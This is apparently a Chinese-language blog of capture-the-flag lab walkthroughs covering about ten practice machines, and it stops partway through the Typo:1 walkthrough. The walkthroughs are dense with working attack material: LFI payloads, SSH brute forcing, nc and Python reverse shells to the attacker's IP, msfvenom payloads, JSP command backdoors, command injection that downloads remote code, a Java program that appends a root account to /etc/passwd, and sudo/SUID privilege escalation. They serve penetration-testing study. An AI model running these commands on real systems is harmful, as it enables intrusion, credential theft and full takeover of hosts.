或许在动手之前需要思考下，如何获取信息是最便捷的，有哪些地方需要搜查，否则可能会因为一次搜点的小疏漏而让工作量提升一半。 参考资料 WP Mysql.Backup curl.Download grep.highlight Deception1.1 2020/04/04 23:31:03 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.110 12345678910111213141516171819202122Nmap scan report for 192.168.31.110Host is up (0.00031s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 75:b3:93:d4:f1:02:30:bf:35:ea:12:4e:3b:e7:fa:4a (RSA)| 256 f9:8c:43:5b:45:7d:fe:84:b1:f5:93:a3:68:bb:ce:84 (ECDSA)|_ 256 77:2a:33:3e:8f:2b:65:a5:f3:df:b5:bc:58:4a:f4:8e (ED25519)80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian))| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-server-header: Apache&#x2F;2.4.38 (Debian)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).MAC Address: 08:00:27:4B:4E:6D (Oracle VirtualBox virtual NIC)Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 22.680 days (since Thu Mar 12 19:47:39 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 尝试爆破80端口下的Web路径 dirb http://192.168.31.110/ -w 1234---- Scanning URL: http:&#x2F;&#x2F;192.168.31.110&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.110&#x2F;index.html (CODE:200|SIZE:1315) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.110&#x2F;manual&#x2F; + http:&#x2F;&#x2F;192.168.31.110&#x2F;server-status (CODE:403|SIZE:279) 漏洞利用 访问/ 该页面提供一个密码强度检测的功能 若密码中含有大写字母、小写字母、数字、特殊符号，且长度为8位及上，则会用alert弹出信息 0000flagflagflagflag.php 而且页面内的内容为 Password is strong , contains all 4 things(uppercase,lowercase,number,specialchars) with flag=1 这里的with flag=1就是个提示 尝试后发现存在php文件/00001111.php alter弹出信息为find password.txt 页面内容为空白 源代码中存在注释信息use ?page= 即可以使用get参数page 访问/00001111.php?page=index.html 此时以页面为主页，则可判断page参数存在包含功能 有两种利用方式 php伪协议进行LFI file伪协议直接读取文件 测试过程中两种方法均可使用，POC如下 12?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 尝试寻找password.txt 最后在找到路径为/var/password.txt 123?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;password.txtI know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH 构造字典如下 12345678910cat dic.py#!&#x2F;bin&#x2F;python2raw &#x3D; &#39;ya5h&#39;charset &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#96;~!@#$%^&amp;*()_+-&#x3D;[]&#123;&#125;\\|;:\\&#39;&quot;,.&lt;&gt;&#x2F;?&#39;for i in charset: for j in charset: print raw + i + j 使用hydra对于SSH服务进行爆破 1234python dic.py &gt; passhydra -I -l yash -P pass -V ssh:&#x2F;&#x2F;192.168.31.110[22][ssh] host: 192.168.31.110 login: yash password: ya5hay 得到账户yash 权限提升 登入服务器 12ssh yash@192.168.31.110ya5hay 查看计划任务 12345678910111213141516171819202122232425cat &#x2F;etc&#x2F;crontab# &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed17 * * * * root cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6 * * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6 * * 7 root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 6 1 * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#*&#x2F;1 * * * * &#x2F;home&#x2F;yash&#x2F;perm.sh 查看文件/home/yash/perm.sh的权限 123ls -l &#x2F;home&#x2F;yash&#x2F;perm.sh -rwxrw-rw- 1 root root 29 Apr 5 2020 &#x2F;home&#x2F;yash&#x2F;perm.sh 该文件可写，可以利用改文件进行计划任务提权 1echo &#39;nc -e &#x2F;bin&#x2F;sh 192.168.31.10 9890&#39; &gt; perm.sh Kali上监听端口 1234nc -lvnp 9890iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 参考资料 LFI Infosec_Warrior01 2020/04/12 11:41:51 端口扫描 nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.172 123456789101112131415161718192021222324Nmap scan report for 192.168.31.172Host is up (0.00054s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: | 1024 2f:b3:a5:cd:e5:14:33:a1:82:3b:dd:5a:5e:d7:59:36 (DSA)|_ 2048 2d:b4:15:28:36:d8:b5:4e:18:81:8e:af:3e:e4:de:c1 (RSA)80&#x2F;tcp open http Apache httpd 2.2.15 ((CentOS))| http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE|_ Potentially risky methods: TRACE|_http-server-header: Apache&#x2F;2.2.15 (CentOS)|_http-title: Apache HTTP Server Test Page powered by CentOSMAC Address: 08:00:27:EC:26:4D (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 2.6.X|3.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13Uptime guess: 0.001 days (since Sat Apr 11 23:43:10 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zeros Web路径枚举 dirb http://192.168.31.172/ -w 1234---- Scanning URL: http:&#x2F;&#x2F;192.168.31.172&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.172&#x2F;cgi-bin&#x2F; (CODE:403|SIZE:290) + http:&#x2F;&#x2F;192.168.31.172&#x2F;sitemap.xml (CODE:200|SIZE:292) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.172&#x2F;wordpress&#x2F; 访问http://192.168.31.172/wordpress/ 响应状态码为500，显示Error establishing a database connection Wordpress框架不可用 访问http://192.168.31.172/sitemap.xml 12345678&lt;urlset&gt; &lt;url&gt; &lt;loc&gt;http:&#x2F;&#x2F;infosecwarrior.com&#x2F;index.htnl&lt;&#x2F;loc&gt; &lt;lastmod&gt;2020-02-13&lt;&#x2F;lastmod&gt; &lt;changefreq&gt;monthly&lt;&#x2F;changefreq&gt; &lt;priority&gt;0.8&lt;&#x2F;priority&gt; &lt;&#x2F;url&gt;&lt;&#x2F;urlset&gt; 漏洞利用 访问http://192.168.31.172/sitemap.xml有一行内容 &lt;loc&gt;http://infosecwarrior.com/index.htnl&lt;/loc&gt; 访问http://192.168.31.172/index.htnl成功 审计html代码 123456&lt;form action&#x3D;&quot;&#x2F;cmd.php&quot; method&#x3D;&quot;GET&quot; hidden&#x3D;&quot;True&quot;&gt; command &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;AI&quot; value&#x3D;&quot;&quot; maxlength&#x3D;&quot;100&quot;&gt; &lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;&lt;&#x2F;form&gt; 删去hidden=&quot;True&quot; 尝试进行命令执行，在表单中输入ls 回显为 12Now the main part what it is looooooolTry other method 而且URL为http://192.168.31.172/cmd.php?AI=ls 改为POST请求 执行成功 1234567891011curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;ls&quot;You Found ME : - (cmd.phphacker.gifindex.htnlminnions.gifnote.txtsitemap.xmlwordpress 即存在命令执行漏洞 查看cmd.php的内容 1234curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;cat cmd.php&quot;$user&#x3D;&quot;isw0&quot;;$pass&#x3D;&quot;123456789blabla&quot;; 获取到账户 权限提升 登入服务器的SSH服务 12ssh isw0@192.168.31.172123456789blabla 查看sudo权限 12345sudo -lUser isw0 may run the following commands on this host: (!root) NOPASSWD: &#x2F;bin&#x2F;bash (root) &#x2F;bin&#x2F;ping, (root) &#x2F;bin&#x2F;ping6, (root) &#x2F;bin&#x2F;rpm, (root) &#x2F;bin&#x2F;ls, (root) &#x2F;bin&#x2F;mktemp 使用root账户的rpm命令进行权限提升 1234sudo -u root rpm --eval &#39;%&#123;lua:posix.exec(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023 Wordpress服务500 在之前的靶机中从来没有遇到这个情况，便主观地猜测靶机配置是否有误，最后看WP的思路才让我顿悟。有几分脑洞，但是sitemap.xml也确实被dirb扫描出来了，里面的index.htnl也是在提示玩家，只能说收集信息的时候还是要仔细看看，毕竟index.html和index.htnl乍一看太难以区分 rpm执行命令 乍一看rpm有sudo，以为要构造恶意安装包来获取提权，没想到rpm可以直接执行命令 参考资料 WP rpm.payload My Tomcat Host: 1 2020/04/25 00:43:06 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.166 Web路径扫描 dirb http://192.168.31.166:8080/ -w 漏洞利用 用浏览器访问8080端口的页面 点击左侧Manager App按钮进行登录，使用默认账户tomcat:tomcat登入成功 上传jsp后门 这里用了两个jsp后门 一个用于浏览文件(https://github.com/rohitcoder/BackDoors) 一个用于执行命令(https://www.cnblogs.com/swyft/articles/5563732.html) 第一个后门的执行命令模块无法使用 保存后门，压缩zip包，改后缀为war，然后在Manager页面进行war包的部署 war包的部署就相当于在网站根目录解压了war包，访问时需要war包的文件名以及包内的文件名 如： 在压缩zip时，压缩文件的文件名为new1.jsp，而压缩之后的zip文件改名为new2.war，那么在部署之后需要访问/new2/new1.jsp 在第二个后门中查看权限 在第一个后门中查看文件，但是没有找到nc 只好用meterpreter来获取一个shell msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=3693 -f elf &gt; hello.elf 然后在第一个后门中上传到目录/tmp下 在MSF中运行handler 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 3693run 上传之后是没有X权限的，这时可以在第二个后门中进行赋权 但是需要注意一点：要对命令进行url编码，以防止url中的特殊符号导致命令无法执行 url编码的结果为chmod%20%2Bx%20%2Ftmp%2Fhello.elf 然后执行meterpreter %2Ftmp%2Fhello.elf MSF中就接收到了shell 权限提升 在meterpreter的shell中获取一个pty，以便之后的切换账户操作 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 这里可以看到tomcat账户可以以任何账户的身份来执行java，而且不需要密码 这很可能是提权的一个突破口 构造密码hash 构造jar包来执行修改passwd文件的命令 1234567891011121314151617181920212223242526cat sudo.javaimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class sudo &#123; public static void main(String[] args) &#123; ProcessBuilder processBuilder &#x3D; new ProcessBuilder(); processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;); try &#123; Process process &#x3D; processBuilder.start(); BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123; System.out.println(line); &#125; int exitCode &#x3D; process.waitFor(); System.out.println(&quot;\\nExited with error code : &quot; + exitCode); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 在Kali启用HTTP服务 python -m 'SimpleHTTPServer' 8800 &amp; 在Shell中使用wget下载java文件 wget http://192.168.31.10:8800/sudo.java 执行EXP 12javac sudo.javasudo -u root java sudo 成功将账户信息写入passwd文件 切换账户即为root权限 JSP后门脚本 123456789101112&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a &#x3D; -1; byte[] b &#x3D; new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a&#x3D;in.read(b))!&#x3D;-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;&#x2F;pre&gt;&quot;); &#125;%&gt; 参考资料 jsp.backdoor jsp.backdoor java jar Clound AV 2020/05/07 22:41:53 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.160 Web路径扫描 dirb http://192.168.31.160:8080/ -w 漏洞利用 访问http://192.168.31.160:8080/，如图 使用burp改变post传递的password的值为%00 出现报错页面 可以看到这里存在sql语句，简单分析后可以判断存在sql注入，注意这里password字段两侧是用双引号，进行sql注入时同样需要使用双引号 构造语句1&quot; or 1--+ 成功登入页面 这里通过输入文件名来对文件进行分析，这里自然可以联想到常见的&quot;Ping tool &amp; Code Injection&quot;，显示出ls -l的结果也算是一种提示吧 本来以为这里是常见的有回显命令注入，但是这个回显实在扫描病毒的结束之后才出现，而且本人进行测试的时候扫描时间很长 为了判断能否执行命令，在Kali上开启HTTP服务 pythom -m SimpleHTTPServer 9990 &amp; 然后尝试命令注入来使用wget下载本地的文件进行测试，以此来判断是否能够进行命令注入，因为开启HTTP服务之后，本地文件被下载是会存在提示的 |wget http://192.168.31.10:9990/1 可以看到文件被下载，说明可以进行命令注入 该靶机上没有nc，不过可以通过python来反弹shell nc -lvvp 9900 | python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.10',9900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot; 即可获取shell 权限提升 由于未知的原因，本人测试时在nc的shell中输入字符会连续出现两次，用起来有些不方便，只好转到MSF 生成Meterpreter后门 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.py 在MSF中配置相关参数 12345use exploit&#x2F;multi&#x2F;handlerset payload python&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9995run 使用wget传递后门并启用 12wget http:&#x2F;&#x2F;192.168.31.10:9900&#x2F;shell.pypython shell.py 在Meterpreter中获取pty 12shellpython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 这时可以看到我们是用户scanner的身份 在home目录下看到一个C的源代码及其编译的程序 值得注意的是，这段代码在使用freshclam扫描文件之前，会将该用户变为root，而且该程序也具有SUID权限 而该程序需要用户输入文件名，如果我们能够对文件名进行注入，使其扫描文件之后再执行一段代码，那么提权就变得简单了 构造反弹Shell脚本 nc监听相应端口 nc -lvvp 9996 执行程序 ./update_cloudav '1| python test.py' /console 在访问路径/console时会要求用户输入pin码，这里可以通过修改HTTP Response包中的信息来进行绕过 本以为给出的python console可以用来直接执行系统命令，但好像只能用于执行js里的一些函数 参考资料 WalkThrough hackNos_Player 2020/05/09 18:39:43 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.33 Web路径扫描 dirb http://192.168.31.33/ -w 漏洞利用 dirb发现了js代码，粗略审计之后并没有获取到有效的信息 在Apache默认页面发现如下提示 路径/g@web/可访问 路径/mini@web/不可访问 /g@web/是一个wordpress站点，使用wpscan进行信息收集 用户枚举 wpscan --url http://192.168.31.33/g@web/ -e u 访问http://192.168.31.33/g@web/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 插件枚举 wpscan --url http://192.168.31.33/g@web/ -e ap 搜索插件相关信息 这里使用searchsploit搜索该插件时缺少了一个RCE的EXP，需要在网上进行搜索 https://wpvulndb.com/vulnerabilities/8949 使用该EXP直接获取shell 123456&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;192.168.31.33&#x2F;g@web&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wpsp_upload_attachment&quot;&gt; Choose a file ending with .phtml: &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;0&quot;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;&lt;&#x2F;form&gt; weevely generate pass shell.phtml 上传后在http://192.168.31.33/g@web/wp-content/uploads/找到上传的后门，再使用weevely连接即可获取shell 权限提升 利用当前webshell获取一个MSF的Shell，方便之后进行账户之间的切换 构造后门程序 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9905 -f raw &gt; pass.php MSFConsole中进行相应配置 12345use explot&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.33set LPORT 9905run 触发MSF后门 curl http://192.168.31.33/g@web/wp-content/uploads/wpsp/pass.php 获取shell之后再获取pty 12shellpython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 根据之前找到的JSON的内容，可以使用hackNos@9012!!来提升我们的权限 查看目录/home的文件夹 尝试之后转换到用户security的身份 12su securityhackNos@9012!! 查看sudo权限 这里可以使用find命令来进行水平提权 12echo &gt; &#x2F;tmp&#x2F;1sudo -u hackNos-boat find &#x2F;tmp&#x2F;1 -exec &#x2F;bin&#x2F;bash \\; 查看sudo权限 然后再使用ruby进行提权 sudo -u hunter /usr/bin/ruby -e 'exec &quot;/bin/bash&quot;' 查看sudo权限 使用gcc进行提权 sudo -u root gcc -wrapper /bin/bash,-s . 即可获取root权限 gcc -wrapper 最后的gcc提权一开始以为是使用system函数来进行执行命令从而进行提权，但是随后发现这个操作需要SUID权限，最后看WP才发现是使用wrapper参数来执行命令 参考资料 wrapper WalkThrough DMV_1 2020/05/14 15:07:33 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.36 Web路径扫描 dirb http://192.168.31.36/ -w 漏洞利用 Web服务的主页是一个Youtube视频在线转换工具，观察发送的请求包，post数据为URL 本地开启HTTP服务，并尝试修改URL 猜测可能存在命令注入 验证存在命令注入漏洞 使用MSFVenom构造Meterpreter后门 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.php 在MSFConsole中配置相关参数 12345use exploit&#x2F;multi&#x2F;handler set payload php&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9995run 通过命令注入来使用wget下载Meterpreter后门 ;wget$&#123;IFS&#125;http://192.168.31.10:9900/shell.php; 触发后门 curl http://192.168.31.36/shell.php &amp; 权限提升 12shellpython -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 这里需要使用PSPY来检测后台的root进程 PSPY: https://github.com/DominicBreuker/pspy/releases 这里可以看到root在运行/var/www/html/tmp/clean.sh 而且该sh脚本可写 那么可以利用root身份执行命令 给find命令添加SUID权限 echo 'chmod u+s /usr/bin/find' &gt;&gt; clean.sh find命令已经获得SUID权限 使用find命令获取root权限 这里可以看到euid=0 查看flag find -&gt; bash 之前使用find进行SUID进行提权时，执行id可以看到euid=0，但是获取bash时却还是原来的权限，这里使用bash -p则可以保留euid 参考资料 WalkThrough Zion 2020/05/21 13:09:10 寻找靶机IP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.1.5 Web路径扫描 dirb http://192.168.1.5/ -w 漏洞利用 访问Web页面 点击Truth 可以看到HTTP Header中存在一些Base编码过的信息 点击Illusion 直接Get请求/zion/login.php 对这些信息进行Base64解码 Truth 这里提示第二段编码中没有’+’, ‘-’, ‘/’, ‘=’ 所以是Base62编码 对第二段编码进行Base62解码 http://decode-base62.nichabi.com/ 这里提示用户名和密码信息存在于选择页面 Illusion 信息无效 Get Request 信息无效 使用cewl进行字典生成 cewl http://192.168.1.5/ &gt; dic1 转换为小写 cat dic1 | tr A-Z a-z &gt; dic2 使用Burp进行账户爆破 得到账户morpheus.thematrix:interpreted 登陆之后点击上方的Private Key 注意txt文本的文件名为 rsa_priv_key_for_w.rabbit.txt 这里保存本地之后再加上Pri_Key文件的头部与尾部 SSH登入目标服务器 ssh -i pri.key w.rabbit@192.168.1.5 权限提升 查看文件warning.txt 查看mail 查看sudu权限 使用sudo权限来进行复制flag文件 这里可以看到flag文件的权限为600 需要在cp文件的同时更改权限，这里使用参数--noreserve mode, ownership 查看flag HTTP信息 根据Post的内容不同，在HTTP Response的Header中给出不同的信息，在实现上并不是难事，思维上也能很快接受这一机制，但是由于之前没有碰到过这种情况，导致在这一步上卡了很久。所以在浏览网页时最好还是使用BurpSuite，以便更加直观地看到全部的信息 参考资料 WalkThrough Broken-2020 2020/05/27 09:52:58 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.116 Web路径扫描 dirb http://192.168.31.116/ -w 漏洞利用 访问http://192.168.31.116/，无有效信息 访问http://192.168.31.116/cms/，如图 根据指示点击按钮 再次访问http://192.168.31.116/，如图 页面发生变化 再次访问http://192.168.31.116/cms/，如图 获取第一个flag 尝试再次扫描Web目录 访问新发现的目录/cms/cc 尝试在端口输入处进行命令注入，失败 开启本地HTTP服务，再输入本地IP以及相应端口 可以看到该页面在请求本地资源1c66b2e0cff58bal7b3f9a1994eb8c55.sh 构造一个反弹Shell的文件，并且监听端口，再在burp中触发该文件 目标机器上下载了该文件并且执行了，接收到反弹Shell 权限提升 查看目录/home/alice下的文本文件 这里提示root在后台运行清除apache日志的脚本，很存在crontab提权 下载pspy64 crontab运行任务如图，可以从/home/alice/script/log.py处入手 可以看到这个script目录所有人可写 即使文件log.py不可写，但是可以凭借目录的权限去修改文件名 本地构造Meterpreter的后门程序 msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9993 -f raw &gt; new.py MSFConsole中进行相应配置 12345use exploit&#x2F;multi&#x2F;handlerset payload python&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 9993run 下载本地的后门程序，并且对文件名进行操作 接收到反弹shell，进入目录/home/alice/backup/ 查看所有文本文件 运行pspy64，可以看到root正在运行脚本backup.py 将web目录输入至path.txt 可以看到html文件夹被备份到了该目录下 而且权限均为777 尝试打包目录/root/ 查看文件夹root下的内容 目录权限&amp;crontab 看着log.py的744权限也是有心无力，参考别人的WalkThrough之后才发现是目录的权限问题。目录可写则可以任意修改目录下的文件名，配合crontab则可以提权。 参考资料 WalkThrough My_Web_Server_1 2020/06/03 19:12:46 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.203 Web路径扫描 dirb http://192.168.31.203/ -w dirb http://192.168.31.203:2222/ -w dirb http://192.168.31.203:8080/ -w dirb http://192.168.31.203:8081/ -w 漏洞利用 可以看到有三个Web入口，端口分别是80,2222,8080,8081 2222端口上运行的是nostromo服务，使用searchsploit查看相关漏洞 存在RCE漏洞，在MSF中进行配置 12345use exploit&#x2F;multi&#x2F;http&#x2F;nostromo_code_execset RHOSTS 192.168.31.203set RPORT 2222set LHOST 192.168.31.10run 即可获得权限 权限提升 查看tomcat的Web账户 cat /usr/local/tomcat/conf/tomcat-users.xml 访问http://192.168.31.203:8080/,点击Manager App 使用账户tomcat:@sprot0230sp进行登入 将jsp后门压缩为zip并更改后缀名 12zip war.zip echo.jspmv war.zip war.war 登入tomcat的Web账户，上传jsp后门 123456789101112&lt;% if(&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a &#x3D; -1; byte[] b &#x3D; new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a&#x3D;in.read(b))!&#x3D;-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;&#x2F;pre&gt;&quot;); &#125;%&gt; 利用原有的Shell构造python反弹Shell脚本 找一个可写目录/var/nostromo/logs/，写入脚本new.py 12345import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]); 本地启用nc监听端口 nc -lvvp 8081 访问jsp后门以执行命令 http://192.168.31.203:8080/war/echo.jsp?pwd=pass&amp;i=python /var/nostromo/logs/new.py 接收到反弹的tomcat用户Shell 这里看到有bash的记录 使用过命令sudo -l 可以使用java进行sudo提权 本地构造java源码 12345678910111213141516171819202122232425import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class sudo &#123; public static void main(String[] args) &#123; ProcessBuilder processBuilder &#x3D; new ProcessBuilder(); processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;); try &#123; Process process &#x3D; processBuilder.start(); BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123; System.out.println(line); &#125; int exitCode &#x3D; process.waitFor(); System.out.println(&quot;\\nExited with error code : &quot; + exitCode); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 即写入账户test:hackforfun 本地启用HTTP服务 python -m SimpleHTTPServer 9900 &amp; 目标服务器上下载源码 wget http://192.168.31.10:9900/sudo.java 编译并执行 12javac sudo.javasudo -u root &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;adoptopenjdk-8-hotspot-amd64&#x2F;bin&#x2F;java sudo 成功写入账户信息 获取pty python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' 切换账户 12su testhackforfun 参考资料 WalkThrough Typo:1 2020/06/09 21:51:36 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.26 Web路径扫描 dirb http://192.168.31.26/ -w dirb http://192.168.31.26:8000/ -w dirb http://192.168.31.26:8080/ -w dirb http://192.168.31.26:8081/ -w 漏洞利用 访问http://192.168.31.26/typo3/ 访问http://192.168.31.26:8080/phpinfo.php 访问http://192.168.31.26:8081/phpmyadmin/ phpmyadmin存在弱口令root:root 登入后查看数据库，typo3对应80端口的Web服务 可以替换表中的Hash值来获取账号权限 访问 https://argon2.online/ 生成Hash 